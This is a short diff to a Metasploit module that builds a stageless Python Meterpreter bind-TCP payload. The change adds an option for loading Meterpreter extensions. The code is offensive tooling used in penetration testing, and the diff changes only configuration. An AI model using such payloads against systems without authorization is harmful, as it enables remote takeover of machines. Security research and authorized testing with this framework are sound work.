@@ -25,6 +25,10 @@ module MetasploitModule
         'Session' => Msf::Sessions::Meterpreter_Python_Python
       )
     )
+
+    register_options([
+      OptString.new('EXTENSIONS', [false, 'Comma-separate list of extensions to load'])
+    ])
   end
 
   def generate_bind_tcp(opts = {})
@@ -34,6 +38,7 @@ module MetasploitModule
     socket_setup << "s, address = bind_sock.accept()\n"
     opts[:stageless_tcp_socket_setup] = socket_setup
     opts[:stageless] = true
+    opts[:extensions] = (datastore['EXTENSIONS'] || '').split(',')
 
     met = stage_meterpreter(opts)
     py_create_exec_stub(met)
